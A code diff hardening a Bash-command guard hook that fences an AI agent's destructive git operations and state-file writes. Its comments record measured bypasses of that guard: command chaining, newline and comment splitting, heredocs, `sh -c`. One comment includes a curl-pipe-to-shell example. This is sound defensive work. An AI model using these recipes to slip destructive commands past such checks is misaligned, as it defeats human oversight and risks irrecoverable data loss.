@@ -41,6 +41,36 @@ const {
 const { resolveGitBinary, gitEnv } = require("./lib/git-subprocess-env.js");
 const { isCoordinationEnabled } = require("./lib/coordination-mode");
 const { resolveMainCheckout } = require("./lib/state-resolver");
+/**
+ * Environment for a NODE child this hook spawns (loom#1471 shard 6).
+ *
+ * Built from constants, same discipline as `gitEnv()`: nothing is inherited, so
+ * `NODE_OPTIONS` (which can `--require` an arbitrary module into the child) and
+ * `NODE_PATH` cannot reach it regardless of what the settings layer does.
+ *
+ * `COC_RUNTIME` is the one pass-through. It is the harness's runtime selector,
+ * legitimately set by the CLI wrapper, and dropping it would change which
+ * runtime the child believes it is under — a behaviour change, not a hardening.
+ * It is additionally covered by the settings-layer blanket `COC_` prefix deny,
+ * so the attacker-delivery path for it is fenced one layer up.
+ */
+function nodeChildEnv() {
+  const env = { PATH: "/usr/bin:/bin", LC_ALL: "C" };
+  if (typeof process.env.COC_RUNTIME === "string") {
+    env.COC_RUNTIME = process.env.COC_RUNTIME;
+  }
+  if (process.platform === "win32") {
+    const amb = process.env.SystemRoot || process.env.SYSTEMROOT;
+    const sysRoot =
+      typeof amb === "string" && path.isAbsolute(amb) ? amb : "C:\\Windows";
+    env.SystemRoot = sysRoot;
+    env.PATH = `${sysRoot}\\System32;${sysRoot}`;
+    for (const k of ["COMSPEC", "PATHEXT", "TEMP", "TMP"]) {
+      if (typeof process.env[k] === "string") env[k] = process.env[k];
+    }
+  }
+  return env;
+}
 // loom#1422 — the THREE Bash-lane protected-path matchers are BUILT from the
 // single registry in lib/guard-path-scope.js. They used to be three hand-kept
 // regex literals here, and the case-insensitivity dimension had to be added to
@@ -104,133 +134,39 @@ process.stdin.on("end", () => {
   }
 });
 
-// Command-wrappers that may precede a `git` invocation. Each may carry its
-// own flags AND a bare flag-operand (e.g. `sudo -u root`, `nice -n 10`); the
-// scan below skips a bare operand ONLY inside an established wrapper context.
-const GIT_WRAPPERS = new Set([
-  "sudo",
-  "doas",
-  "env",
-  "command",
-  "nice",
-  "nohup",
-  "time",
-  "timeout",
-  "ionice",
-  "setsid",
-  "stdbuf",
-  "chrt",
-  "taskset",
-]);
-// `git`, `/usr/bin/git`, `./git`, `\git` — a path-qualified, bare, or
-// backslash-escaped git token. The optional leading `\` closes the
-// MED-R3-1 alias-bypass form (`\git clean` runs the git binary at bash
-// runtime; the backslash only skips alias/function lookup). The `$IFS`
-// form (`git$IFS clean`) is NOT closable here — it requires shell
-// expansion the hook MUST NOT perform (hook-output-discipline.md Rule 3 /
-// security.md § no-eval) — and stays an accepted residual backed by the
-// sync-tier-aware pre-write snapshot (the surface-agnostic forever-layer).
-const isGitToken = (t) => /^\\?(?:[^\s]*\/)?git$/.test(t);
+// loom#1549 F3 — the git-invocation parser moved to lib/git-command-parse.js.
+// It used to live HERE and nowhere else, so the pairing guard
+// (fold-amendment-paired-with-helper.js) grew its own `/\bcommit\b/` lineage
+// instead of reusing it — the divergence kailash-rs rejected the Gate-2 sync
+// over. One parser, every consumer, per security.md § Multi-Site Kwarg
+// Plumbing; same shape as tool-classes.js for tool names.
+const {
+  parseGitInvocation,
+  parseGitInvocations,
+  stripShellComments,
+  expandNestedSegments,
+} = require(path.join(__dirname, "lib", "git-command-parse.js"));
 
 /**
- * Parse a shell segment as a git invocation, tolerant of command-prefixes
- * (sudo/doas/env/command/nice/… including their `-flag operand` forms, plus
- * `VAR=val` assignments and a path-qualified `git`) AND git global options
- * (`-C <dir>`, `-c <k=v>`, `--git-dir[=]`, `--work-tree[=]`, `-p`, `--bare`,
- * …) that sit BEFORE the subcommand. Returns { sub (lowercased), dir (the
- * effective work-tree for the structural check — `--work-tree` wins over
- * `-C`, else null=cwd), args (post-subcommand remainder) } or null when the
- * segment is not a git invocation.
+ * The ONE commit-detection predicate for this hook (loom#1549 HIGH-3).
  *
- * HIGH-1 (R1): the prior `^git\s+<sub>` anchors were bypassed by
- * `git -C <dir> <sub>` — the cross-tree form the #401 incident used.
- * HIGH-R2-1 (R2): the prefix-stripper regex was bypassed by `sudo -u root
- * git …` (the `-u` operand is not a dash-flag), `command git …`, and
- * `/usr/bin/git …`. This tokenize-and-skip scan closes that class.
- * MED-R2-1 (R2): `--work-tree=<dir>` attached form is now captured so the
- * porcelain check inspects the SAME tree the destructive op mutates.
+ * Three sites each carried their own `git commit` regex — two `^`-anchored and
+ * one `\b`-anchored — which is the same multi-lineage drift this whole issue is
+ * about, reproduced INSIDE the file the shared parser was extracted from. The
+ * `^` form was blind to `cd sub && git commit`, `git -C /repo commit`, `sudo git
+ * commit`, and `env VAR=x git commit`; the `\b` form fired on `git log
+ * --grep=commit`. Dispatching on the parsed SUBCOMMAND POSITION is the only
+ * thing that separates those structurally.
+ *
+ * Returns the invocation (carrying `.dir` and `.unresolvable`) or null, so a
+ * caller that needs the retargeted repository can have it rather than assuming
+ * the session cwd.
+ *
+ * @param {string} command
+ * @returns {{sub:string,dir:string|null,args:string,unresolvable:string|null}|null}
  */
-function parseGitInvocation(seg) {
-  const raw = (seg || "").trim();
-  if (!raw) return null;
-  const toks = raw.split(/\s+/).filter(Boolean);
-
-  // (1) Skip leading wrappers + their flags/operands + VAR=val until `git`.
-  let i = 0;
-  let sawWrapper = false;
-  while (i < toks.length) {
-    const t = toks[i];
-    if (isGitToken(t)) break; // the git command token
-    if (/^[A-Za-z_]\w*=/.test(t)) {
-      i++;
-      continue;
-    } // VAR=val assignment
-    if (GIT_WRAPPERS.has(t.replace(/^.*\//, ""))) {
-      sawWrapper = true;
-      i++;
-      continue;
-    } // wrapper command name (basename, so `/usr/bin/sudo` counts)
-    if (t.startsWith("-")) {
-      i++;
-      continue;
-    } // a flag (wrapper's or env's)
-    if (sawWrapper) {
-      i++;
-      continue;
-    } // bare flag-operand inside wrapper context (e.g. `-u root`)
-    return null; // bare non-git command outside wrapper context → not git
-  }
-  if (i >= toks.length || !isGitToken(toks[i])) return null;
-  i++; // consume the git token
-
-  // (2) Skip git global options; capture the effective work-tree for the
-  // structural porcelain check. A bare `--git-dir` does NOT set the target
-  // (its work-tree defaults to cwd); only `--work-tree`/`-C` relocate it.
-  let cDir = null;
-  let workTree = null;
-  while (i < toks.length) {
-    const t = toks[i];
-    if (t === "--") {
-      i++;
-      break;
-    }
-    if (t === "-C") {
-      if (toks[i + 1]) cDir = toks[i + 1];
-      i += 2;
-      continue;
-    }
-    if (t === "--work-tree") {
-      if (toks[i + 1]) workTree = toks[i + 1];
-      i += 2;
-      continue;
-    }
-    if (
-      t === "-c" ||
-      t === "--git-dir" ||
-      t === "--namespace" ||
-      t === "--super-prefix"
-    ) {
-      i += 2;
-      continue;
-    }
-    const wt = t.match(/^--work-tree=(.+)$/);
-    if (wt) {
-      workTree = wt[1];
-      i++;
-      continue;
-    }
-    if (t.startsWith("-")) {
-      i++; // --git-dir=X, -p, --paginate, --bare, --no-pager, etc.
-      continue;
-    }
-    break; // first non-option token = the subcommand
-  }
-  if (i >= toks.length) return null;
-  return {
-    sub: toks[i].toLowerCase(),
-    dir: workTree || cDir,
-    args: toks.slice(i + 1).join(" "),
-  };
+function findCommitInvocation(command) {
+  return parseGitInvocations(command).find((g) => g.sub === "commit") || null;
 }
 
 /**
@@ -303,6 +239,54 @@ function validateBashCommand(data) {
   const command = data.tool_input?.command || "";
   const cwd = data.cwd || process.cwd();
 
+  // loom#1606 instances 4-8 — the SEVERITY-ORDERING deferral, same shape as the
+  // `deferredScopeAdvisory` fix below but for the five topic branches that
+  // return the full instructAndWait FINDING rather than a bare message.
+  //
+  // This function is FIRST-MATCH-WINS ordered by TOPIC, not by SEVERITY, so
+  // every non-`block` return suppresses every `block` fence beneath it — and
+  // `halt-and-report` is NOT blocking (instruct-and-wait.js:147 returns
+  // `continue:true` for every non-block severity, so the tool call RUNS). That
+  // is why six of the seven instances read as harmless to every prior reviewer:
+  // the code says "halt", the runtime does not halt.
+  //
+  // Declared at the function head rather than beside the first deferral site,
+  // because the earliest of the five (the cross-repo ceremony, immediately
+  // below) sits ABOVE the `deferredScopeAdvisory` declaration.
+  const deferredFindings = [];
+
+  // Merge every deferred finding into whichever result the function finally
+  // reaches. EVERY `return` downstream of the first deferral site routes
+  // through this — not just the non-blocking ones — or the finding is silently
+  // destroyed, which is the dead-code defect the Tier-1 adversarial review
+  // caught on the first three fixes (see withScopeAdvisory below).
+  //
+  // Severity is the MAX of {deferred, result}: a `block` below always wins and
+  // is never weakened, and a deferred `halt-and-report` is never downgraded to
+  // a bare advisory. A legacy `{continue:true, message}` result carries no
+  // severity, so its message rides out as a trailing report line rather than
+  // being dropped when a finding is pending.
+  const withDeferred = (result) => {
+    if (deferredFindings.length === 0) return result;
+    const all = result.severity
+      ? [...deferredFindings, result]
+      : [...deferredFindings];
+    const merged = {
+      severity: all.some((f) => f.severity === "block")
+        ? "block"
+        : "halt-and-report",
+      what_happened: all.map((f) => f.what_happened).join("\n\n"),
+      why: all.map((f) => f.why).join("\n\n"),
+      agent_must_report: all.flatMap((f) => f.agent_must_report || []),
+      agent_must_wait: all.map((f) => f.agent_must_wait).join(" "),
+      user_summary: all.map((f) => f.user_summary).join(" | "),
+    };
+    if (!result.severity && result.message) {
+      merged.agent_must_report = [...merged.agent_must_report, result.message];
+    }
+    return merged;
+  };
+
   // GUIDE-FIRST cross-repo ceremony (B — journal/0488 RC1+RC3). This is the
   // PreToolUse Bash tripwire, so the guidance arrives BEFORE the cross-repo
   // command runs — the agent can honor the halt and run /cross-repo-authorize
@@ -321,7 +305,20 @@ function validateBashCommand(data) {
     const target = crossRepo.target || "<owner/repo>";
     const intent = crossRepo.intent || "write";
     const isRead = intent === "read";
-    return {
+    // loom#1606 instance 4 — DEFER, never return. `detectRepoScopeDriftBash` is
+    // segment-anchored, so `gh issue list --repo other/repo && git reset --hard`
+    // fired on segment 1 and returned here, and EVERY fence below — the
+    // state-file block, the coordination block, both irrecoverable git fences —
+    // never ran. MEASURED with a control on a dirty tree:
+    //   git reset --hard HEAD                     (alone)  -> exit 2 BLOCK
+    //   gh issue list --repo other-org/other-repo && <same> -> exit 0 ALLOW
+    //
+    // This one carries a PERVERSE INVERSION: the detector returns null when a
+    // `.claude/cross-repo-authz/` receipt exists, so an AUTHORIZED cross-repo
+    // command fell through and got fenced normally while an UNAUTHORIZED one
+    // short-circuited and disabled the fence — the less legitimate the command,
+    // the weaker the enforcement.
+    deferredFindings.push({
       severity: "halt-and-report",
       what_happened: `Cross-repo ${intent} against ${target} attempted with no authorizing receipt (repo-scope-discipline.md § User-Authorized Exception).`,
       why: crossRepo.rule_id,
@@ -336,7 +333,7 @@ function validateBashCommand(data) {
       agent_must_wait:
         "Do not run the cross-repo command until /cross-repo-authorize has written the receipt (or the user explicitly redirects).",
       user_summary: `${crossRepo.rule_id} — cross-repo ${intent} ${target}: run /cross-repo-authorize first`,
-    };
+    });
   }
 
   // ADVISORY (loom #19 P3): branch-scope warn on `git commit` invocations.
@@ -345,18 +342,65 @@ function validateBashCommand(data) {
   // loom#1368: the `(?![\w-])` negative lookahead is load-bearing. A trailing
   // word-boundary escape admits the `commit-tree` and `commit-graph`
   // sub-commands, which spawned this scope delegation on a non-commit.
-  if (/^\s*git\s+commit(?![\w-])/.test(command)) {
+  // loom#1549 HIGH-3 — was `/^\s*git\s+commit(?![\w-])/`. The `^` anchor made
+  // this blind to every commit that is not the FIRST thing in the command:
+  // `cd sub && git commit`, `git -C /repo commit`, `sudo git commit`,
+  // `env GIT_AUTHOR_NAME=x git commit`. The shared parser matches all four.
+  // loom#1606 — holds the branch-scope advisory (below) across the remaining
+  // BLOCKING checks. Declared here rather than at the emit site so the
+  // ordering contract is visible: advisory is collected, blocks still fire,
+  // and it rides out on whichever non-blocking exit is reached.
+  let deferredScopeAdvisory = null;
+
+  // Compose the deferred advisory onto ANY non-blocking message. Every
+  // `continue:true` return downstream of the advisory site MUST route through
+  // this, or the advisory is silently destroyed.
+  //
+  // The first cut emitted it at the clean exit ONLY, which made it DEAD CODE:
+  // the advisory is set under `findCommitInvocation(command)`, and the
+  // `git commit` reminder below tests that SAME predicate and returns
+  // unconditionally — so the clean exit was unreachable on every path that
+  // could have set the variable. Measured: `git commit -m wip` on a
+  // scope-violating branch returned only "REMINDER: Code review completed?"
+  // and the scope warning vanished. That traded advisory-delivered/
+  // block-skipped for block-delivered/advisory-destroyed — a different bug,
+  // not a fix. Caught by the Tier-1 adversarial security review.
+  const withScopeAdvisory = (msg) =>
+    deferredScopeAdvisory ? `${deferredScopeAdvisory}\n\n${msg}` : msg;
+
+  if (findCommitInvocation(command)) {
     try {
       const { spawnSync } = require("child_process");
       const scopeScript = path.join(__dirname, "pre-commit-branch-scope.js");
-      const r = spawnSync("node", [scopeScript], {
+      // loom#1471 shard 6. This file's GIT calls were hardened in shard 2 and
+      // its NODE calls were not — the same sibling-blindness that left the py
+      // overlay and guard-path-scope behind, and the regrowth guard cannot see
+      // it because that guard greps for a literal `git`, never a `node`.
+      // `process.execPath` removes the PATH lookup; the env is built from
+      // constants so the child cannot be steered by NODE_OPTIONS/NODE_PATH.
+      //
+      // SEVERITY, stated honestly: PATH, NODE_OPTIONS and NODE_PATH are ALL
+      // already in settings-deny-guard-shape.js::DANGEROUS_ENV_EXACT, so this
+      // is defence-in-depth rather than an open hole. It is NOT the severity of
+      // the template-resolver shim, whose LOOM_LINKS_CONFIG is genuinely
+      // unfenced. Recorded so the site count does not inflate the risk.
+      const r = spawnSync(process.execPath, [scopeScript], {
         cwd,
         encoding: "utf8",
         timeout: 4500,
+        env: nodeChildEnv(),
       });
       const output = (r.stderr || "").trim();
       if (output) {
-        return { continue: true, exitCode: 0, message: output };
+        // loom#1606 — DEFER, never return. This is an ADVISORY (`continue:
+        // true`); returning it here short-circuited every BLOCKING check
+        // below, because this function is a sequence of positional early
+        // returns. On any scoped branch carrying one out-of-scope file the
+        // advisory fired first and the state-file mutation fence never ran —
+        // so `git commit -m x && rm .claude/learning/posture.json` returned
+        // ALLOW. An advisory MUST NOT pre-empt a block; it is held and
+        // emitted at the clean exit only if nothing blocked first.
+        deferredScopeAdvisory = output;
       }
     } catch {
       // Advisory failure must never block the commit.
@@ -374,26 +418,69 @@ function validateBashCommand(data) {
   // loom#1368: the `(?![\w-])` negative lookahead is load-bearing — see the
   // scope delegation above; a trailing word-boundary escape admits the
   // `commit-tree` and `commit-graph` sub-commands.
-  if (/^\s*git\s+commit(?![\w-])/.test(command)) {
+  // loom#1549 HIGH-3 — same `^`-anchor blindness as the scope delegation above,
+  // and it matters MORE here: this gates the loom#263 synced-artifact disclosure
+  // scan, the fence that stops an operator hostname / org slug / home path from
+  // reaching 30+ consumers' PERMANENT git history. `cd sub && git commit`
+  // skipped it entirely.
+  //
+  // An `unresolvable` target does NOT skip the scan. The safe disposition for a
+  // disclosure fence is to scan anyway: the cost of scanning a commit we cannot
+  // fully attribute is a wasted spawn, and the cost of skipping one is
+  // unrecoverable once pushed.
+  const commitInv = findCommitInvocation(command);
+  if (commitInv) {
     try {
       const { spawnSync } = require("child_process");
       // Only run when the commit stages a synced-surface path. Cheap
       // pre-filter — avoids scanning on commits that touch only non-
       // `.claude/**` files (the scanner already excludes never-synced
       // subpaths internally, but skipping the spawn entirely is faster).
-      const staged = spawnSync("git", ["diff", "--cached", "--name-only"], {
-        cwd,
-        encoding: "utf8",
-        timeout: 3000,
-      });
-      const stagedFiles = (staged.stdout || "")
+      // loom#1471 shard 2 — same class; `--cached` reads the INDEX, which
+      // GIT_DIR relocates wholesale, so a decoy index would mask which synced
+      // paths a commit actually stages.
+      const gitBin = resolveGitBinary();
+      // loom#1549 HIGH-3 second-order: this read the session `cwd` INDEX even
+      // when the commit retargets with `-C`, so `git -C /other commit` scanned
+      // the wrong repository's staged set — reporting "no synced paths" for a
+      // commit that stages plenty. Only honour a target the parser could fully
+      // resolve; an `unresolvable` one (`-C "$PWD"`, `-C $(…)`) falls back to
+      // `cwd`, which is where an unexpanded value would most likely have
+      // pointed anyway, and never to a path built from bytes we did not expand.
+      const commitDir =
+        commitInv.dir && !commitInv.unresolvable ? commitInv.dir : cwd;
+      const staged = gitBin
+        ? spawnSync(gitBin, ["diff", "--cached", "--name-only"], {
+            cwd: commitDir,
+            encoding: "utf8",
+            timeout: 3000,
+            env: gitEnv(),
+          })
+        : null;
+      const stagedFiles = ((staged && staged.stdout) || "")
         .split("\n")
         .map((s) => s.trim())
         .filter(Boolean);
-      const touchesSynced = stagedFiles.some(
-        (f) =>
-          f.startsWith(".claude/") || f === "AGENTS.md" || f === "GEMINI.md",
-      );
+      // Unresolvable git makes the pre-filter INDETERMINATE, not negative. An
+      // empty list would silently SKIP the disclosure scan — fail-open, and the
+      // exact shape this sweep exists to remove. Rank it tightest: scan.
+      //
+      // loom#1471 shard 4. The `!gitBin` arm alone was NOT the whole fail-open.
+      // A git that RAN and FAILED — timeout, exit 128, a `safe.directory`
+      // refusal — leaves `stdout` empty, so `stagedFiles` is `[]`, `.some()` is
+      // false, and the loom#263 disclosure scan was silently SKIPPED on a real
+      // `git commit`. The status was never inspected. Every non-zero/errored
+      // outcome now ranks tightest and scans, matching the sibling
+      // dirty-tree probe above, which already gates on
+      // `r.status !== 0 || typeof r.stdout !== "string"`.
+      const stagedIndeterminate =
+        !gitBin || !staged || Boolean(staged.error) || staged.status !== 0;
+      const touchesSynced =
+        stagedIndeterminate ||
+        stagedFiles.some(
+          (f) =>
+            f.startsWith(".claude/") || f === "AGENTS.md" || f === "GEMINI.md",
+        );
       if (touchesSynced) {
         const scanScript = path.join(
           __dirname,
@@ -401,10 +488,15 @@ function validateBashCommand(data) {
           "bin",
           "scan-synced-disclosure.mjs",
         );
-        const r = spawnSync("node", [scanScript, "--check"], {
+        // loom#1471 shard 6 — see the scope delegation above. This one is the
+        // pointed case: it is the loom#263 disclosure scanner, i.e. the guard
+        // the regrowth test exists to protect, spawned by a shape that test
+        // structurally cannot detect.
+        const r = spawnSync(process.execPath, [scanScript, "--check"], {
           cwd,
           encoding: "utf8",
           timeout: 4000,
+          env: nodeChildEnv(),
         });
         // r.status === null on spawn failure/timeout → fail-open.
         // r.error set on ENOENT / timeout → fail-open.
@@ -413,7 +505,15 @@ function validateBashCommand(data) {
         if (!r.error && r.status === 1) {
           const report = (r.stderr || r.stdout || "").trim();
           const sample = report.split("\n").slice(0, 12).join("\n");
-          return {
+          // loom#1606 instance 5 — DEFER, never return. Returning the
+          // disclosure finding here short-circuited the state-file block and
+          // both irrecoverable git fences below. MEASURED with a control, with
+          // a staged synthetic operator-home token making the scanner exit 1:
+          //   git reset --hard HEAD              (alone)  -> exit 2 BLOCK
+          //   git commit -m wip && <same command>         -> exit 0 ALLOW
+          // The disclosure finding is real and still surfaces; it simply no
+          // longer consumes the turn that the destructive-op fence needed.
+          deferredFindings.push({
             severity: "halt-and-report",
             what_happened:
               "scan-synced-disclosure.mjs --check found ≥1 structural " +
@@ -449,7 +549,7 @@ function validateBashCommand(data) {
             user_summary:
               "synced-disclosure scan blocked the commit (loom #263) — " +
               "genericize + relocate to the operator-local companion",
-          };
+          });
         }
       }
     } catch {
@@ -801,7 +901,7 @@ function validateBashCommand(data) {
     const isLayer3BlockPath =
       stateFileMutation.layer === 3 && LAYER3_BLOCK_RX.test(command);
     if (isStructural || isLayer3BlockPath) {
-      return {
+      return withDeferred({
         severity: "block",
         what_happened: isStructural
           ? `Bash command attempts to mutate trust-posture state file (Layer ${stateFileMutation.layer}: ${stateFileMutation.kind}): ${command.slice(0, 120)}`
@@ -814,7 +914,7 @@ function validateBashCommand(data) {
           "State whether you intended to read, debug, or modify the state",
           isStructural
             ? "If reading: use `cat` (allowed); if modifying: use /posture command instead"
-            : "If reading: use `cat`, or an interpreter body with NO write token (a read-only `-e`/`-c` body passes the #1292 gate — this is how /codify Step 6b filters the violation records); posture routes through /posture, roster through /whoami --register, coordination-log through the canonical signed-append ceremony — never an inline interpreter write",
+            : "If reading: use `cat`, or an interpreter body with NO write token (a read-only `-e`/`-c` body passes the #1292 gate — this is how /codify Step 6b filters the violation records). NOTE: a SHELL-OUT from inside the interpreter body counts as a write token — `execSync` / `child_process` / `subprocess.*` / `os.system` / `spawn`(`Sync`) / `Popen` / ruby-perl `%x{}` / `qx{}` all match, because the scanner cannot analyse the inner command and so must rank it write. Fetch the shell value OUTSIDE the interpreter body and pass it in via env or argv. Posture routes through /posture, roster through /whoami --register, coordination-log through the canonical signed-append ceremony — never an inline interpreter write",
           // #1363: the WRITING-ABOUT-state-files case. A protected path quoted in
           // human prose is masked (quote-aware, every prose carrier), but a body
           // that genuinely EXECUTES — a live backtick or `$(…)` inside DOUBLE
@@ -826,12 +926,19 @@ function validateBashCommand(data) {
         agent_must_wait:
           "Do not retry the same form. State-file mutations route through the canonical ceremony (challenge-nonce / quorum / signed-append gated), never directly. If the command was PROSE about a state file rather than a mutation, re-issue it in the quoted/`--body-file` form above rather than re-running it verbatim.",
         user_summary: `state-file mutation blocked (Layer ${stateFileMutation.layer}${isStructural ? "" : ", non-fold-derived"})`,
-      };
+      });
     }
     // Layer 3 on a genuinely-bounded path (observations.jsonl / ephemeral caches)
     // — advisory (non-blocking): lexical body scan, and the forgery is neutralized
     // WITHOUT relying on a fold (nonce-gated promotion / self-harm-only wipe).
-    return {
+    //
+    // loom#1606 instance 6 — DEFER, never return. This is the ADVISORY arm of
+    // the state-file lane (the Layer-1/2/3-block arm above returns and is
+    // terminal). Returning here short-circuited both irrecoverable git fences.
+    // MEASURED with a control on a tree carrying untracked files:
+    //   git clean -fd                                    (alone)  -> exit 2 BLOCK
+    //   node -e "…appendFileSync('…/observations.jsonl',…)" && <same> -> exit 0 ALLOW
+    deferredFindings.push({
       severity: "halt-and-report",
       what_happened: `Bash command references a bounded trust-posture state file inside an interpreter body (Layer 3: ${stateFileMutation.kind}): ${command.slice(0, 120)}`,
       why: "trust-posture/state-file-mutation (Layer 3 on a bounded path — observations.jsonl / .heartbeat-cache / .session-end-cache — advisory per #1293 Option X + hook-output-discipline.md MUST-2) — a lexical scan of an interpreter -c/-e/-m body cannot tell an executed write from a read-only body or a write-example quoted as documentation, so block-severity here is the recurring false-positive class. This surfaces as advisory because the forgery is neutralized WITHOUT a fold: a forged positive observation cannot self-upgrade (challenge-nonce gated) and a wipe only harms the agent's own upgrade eligibility. Autonomy/authority state (posture, .initialized, presence, violations, roster, coordination-log) stays BLOCKED.",
@@ -843,7 +950,7 @@ function validateBashCommand(data) {
       agent_must_wait:
         "Advisory only — the command was NOT blocked. A forged positive observation cannot upgrade posture (challenge-nonce gated); do not rely on hand-written state.",
       user_summary: `state-file bounded interpreter-body reference flagged (Layer 3, advisory)`,
-    };
+    });
   }
 
   // HALT-AND-REPORT: `git config` write to a security-load-bearing key of THIS
@@ -875,7 +982,13 @@ function validateBashCommand(data) {
         key: gitConfigMutation.key,
       });
     } catch {}
-    return {
+    // loom#1606 instance 7 — DEFER, never return. Returning this advisory
+    // short-circuited both irrecoverable git fences below, so the very command
+    // shape that repoints `core.hooksPath` could carry a destructive op past
+    // them in the same chain. MEASURED with a control on a dirty tree:
+    //   git reset --hard HEAD                  (alone)  -> exit 2 BLOCK
+    //   git config core.hooksPath /tmp/x && <same>      -> exit 0 ALLOW
+    deferredFindings.push({
       severity: "halt-and-report",
       what_happened: `Bash command writes a security-load-bearing key of this repository's own git config (${gitConfigMutation.kind}): ${command.slice(0, 120)}`,
       why: "loom#1470 defeat 2 — `.git/config` is the file every git-derived security property in this repo reads its answer from (commit attestation, repo-family jurisdiction, the subprocess-env allowlist). The fenced keys are the ones that carry authority rather than ergonomics: `core.repositoryformatversion` makes every git command in the repo refuse; `core.worktree`/`core.bare` repoint the working tree every path-scoped fence resolves against; `core.hooksPath`/`core.fsmonitor`/`core.sshCommand` each name a program git EXECUTES during ordinary operations; `include.path`/`includeIf.*.path` pull an attacker-chosen config file in and re-open all of the above indirectly; `extensions.*` is repository-format state. `GIT_CONFIG_NOSYSTEM` and `GIT_CONFIG_GLOBAL=/dev/null` cannot neutralise any of it — a repository's OWN config is always read — so the Bash boundary is the only place this is visible before it runs. Advisory per hook-output-discipline.md MUST-2: this is a lexical command-string match, so it reports rather than blocks.",
@@ -887,7 +1000,7 @@ function validateBashCommand(data) {
       agent_must_wait:
         "Advisory only — the command was NOT blocked. Reads of these keys pass unflagged; `--global`/`--system` writes are out of scope by construction, and `git -c key=value <cmd>` is a per-invocation override that persists nothing. If you need a per-command setting, prefer that form over a persistent write.",
       user_summary: `git config write to ${gitConfigMutation.key} flagged (advisory)`,
-    };
+    });
   }
 
   // BLOCK (conditional): coordination-mode.json Bash mutation on an ENROLLED repo.
@@ -946,7 +1059,7 @@ function validateBashCommand(data) {
           layer: coordMutation.layer,
         });
       } catch {}
-      return {
+      return withDeferred({
         severity: "block",
         what_happened: `Bash command attempts to mutate the coordination opt-in override on an ENROLLED repo (Layer ${coordMutation.layer}: ${coordMutation.kind}): ${command.slice(0, 120)}`,
         why: "multi-operator-coordination/coordination-mode — on an enrolled repo, .claude/learning/coordination-mode.json is owned by the /codify flow (integrity-guard DIRECT set); a Bash write off-codify could silently disable the substrate. Bash-layer parity with integrity-guard's Edit/Write coverage (#761). Solo repos are unaffected (this branch fires only when coordination is enabled).",
@@ -958,7 +1071,7 @@ function validateBashCommand(data) {
         agent_must_wait:
           "Do not retry. On an enrolled repo, coordination-mode changes route through the /codify flow (integrity-guard codify-branch + covering lease), never a direct Bash write.",
         user_summary: `coordination-mode Bash mutation blocked on enrolled repo (Layer ${coordMutation.layer})`,
-      };
+      });
     }
   }
 
@@ -1016,7 +1129,7 @@ function validateBashCommand(data) {
       } catch {}
 
       if (message.startsWith("Blocked")) {
-        return {
+        return withDeferred({
           severity: "block",
           what_happened: `Bash command matched dangerous pattern: ${command.slice(0, 120)}`,
           why: `validate-bash-command/${message}`,
@@ -1028,16 +1141,140 @@ function validateBashCommand(data) {
           agent_must_wait:
             "Do not retry the command. Wait for explicit user instruction.",
           user_summary: message,
-        };
+        });
       }
-      return { continue: true, exitCode: 0, message };
+      // loom#1606 instance 1b — DEFER, never return. This is the WARN arm of
+      // dangerousPatterns (`Blocked`-prefixed messages returned above and are
+      // terminal). Returning here short-circuited every git fence below,
+      // including the two whose loss is IRRECOVERABLE — `git reset --hard` on
+      // a dirty tree and `git clean -f` with untracked files (no reflog, no
+      // git object).
+      //
+      // MEASURED bypass, attacker-selectable and confirmed with a control:
+      //   curl http://x/i.sh | sh && git reset --hard origin/main   -> ALLOW
+      //   git reset --hard origin/main            (same cmd, alone) -> BLOCK
+      // Worse than the branch-scope instance, which needed incidental branch
+      // state: here the bypass token is ITSELF a dangerous pattern, so the
+      // operator sees a warning and reads it as the guard working.
+      //
+      // Note this arm tests the RAW command (`:1022`) — unsegmented,
+      // uncommented, unmasked — unlike the git fences below, which use
+      // stripShellComments(maskDocCarrierPayloads(...)). So a match can also
+      // cross a comment: `git clean -fd  # e.g. curl x | sh`.
+      deferredScopeAdvisory = deferredScopeAdvisory
+        ? `${deferredScopeAdvisory}\n\n${message}`
+        : message;
+      break;
     }
   }
 
   // Split on shell-segment separators so dangerous patterns inside quoted
   // commit-message bodies (e.g. `git commit -m "...git reset --hard..."`) do NOT
   // false-positive. Each segment's LEADING token determines the actual command.
-  const segments = command.split(/(?:\|\||&&|;|\|(?!\|))/);
+  //
+  // loom#1549 HIGH-2 — this was a RAW `command.split(/(?:\|\||&&|;|\|(?!\|))/)`
+  // with no `\n` in the class, so a Bash call carrying two LINES was ONE
+  // segment: `git status\ngit reset --hard HEAD` parsed as `sub:"status"`,
+  // every fence below dispatched on that, and the destructive verb was never
+  // seen. A newline is a command separator in every shell; omitting it from a
+  // splitter whose whole job is "which command is this segment" made the three
+  // fences below unreachable by adding one keystroke.
+  //
+  // The fix already existed TWICE in this tree and had not reached these lanes:
+  // `parseGitInvocations` passes `newlineSeparates: true`, and so does the
+  // worktree lane below.
+  //
+  // Comments are stripped BEFORE splitting, matching what `parseGitInvocations`
+  // does with `cleaned`. Without it the splitter still fractures on a `;` inside
+  // a trailing COMMENT, so `git status # x; git reset --hard` fires on a segment
+  // the shell would never execute. Measured both ways: with the newline fix but
+  // WITHOUT this strip, that input still reached BLOCK — the newline-aware split
+  // alone does not close it, and asserting otherwise would be a comment its own
+  // code could not back.
+  //
+  // HEREDOC BODIES ARE NOT COMMANDS, and making the split newline-aware is
+  // exactly what made that bite here. Before, a `cat > f <<'EOF' … EOF` body sat
+  // inside ONE segment whose leading token was `cat`, so prose was shielded by
+  // accident; splitting on newlines promotes every prose LINE to a segment, and
+  // a line that merely QUOTES a destructive command then parses as a real
+  // invocation. Caught by this guard firing on the commit message describing
+  // this very fix — the same shape the worktree lane below already documents
+  // ("including a `git commit -F- <<'EOF'` commit message for this PR"). That
+  // lane solved it and the solution had not reached these three; this is the
+  // third such gap in this file, which is the point of #1549.
+  //
+  // `.structural` is the command with every heredoc BODY and close line removed.
+  // On the parser's work-budget overflow it is absent, so the walk gets an empty
+  // string and finds nothing — failing OPEN on an unverifiable signal, which is
+  // the disposition MUST-2 requires over guessing.
+  const heredocSpans =
+    command.indexOf("<<") === -1
+      ? { structural: command }
+      : parseHeredocSpans(command);
+  const rawSegments = splitShellSegments(
+    stripShellComments(maskDocCarrierPayloads(heredocSpans.structural || "")),
+    { newlineSeparates: true },
+  );
+
+  // NESTED SHELL BODIES ARE COMMANDS (loom#1589). A `-c` operand or an `eval`
+  // body is a command string the tokenizer already isolated, so the destructive
+  // verb inside it sits in a real subcommand POSITION — it is simply one level
+  // down. Measured against a genuinely dirty checkout BEFORE this expansion:
+  // `sh -c 'git reset --hard HEAD'`, `bash -c 'git clean -fd'`,
